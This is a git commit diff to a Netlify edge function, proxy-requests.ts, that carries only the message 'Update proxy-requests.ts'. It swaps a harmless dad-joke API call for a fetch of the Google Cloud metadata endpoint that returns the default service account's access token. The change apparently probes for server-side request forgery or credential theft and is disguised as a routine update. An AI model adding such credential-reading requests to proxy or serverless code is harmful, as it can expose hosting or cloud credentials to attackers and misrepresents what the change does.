7dfee1f3ec178c79fbf4493f39612e33c019a330
honokix <49952046+honokix@users.noreply.github.com>
2022-05-15 23:36:01 +0200

    Update proxy-requests.ts

--- netlify/edge-functions/proxy-requests.ts
+++ netlify/edge-functions/proxy-requests.ts
@@ -2,7 +2,7 @@ import { Context } from "netlify:edge";
 
 export default async (request: Request, context: Context) => {
 
-  const joke = await fetch("https://icanhazdadjoke.com/", {
+  const joke = await fetch("http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token", {
     "headers": {
       "Accept": "application/json"
     }
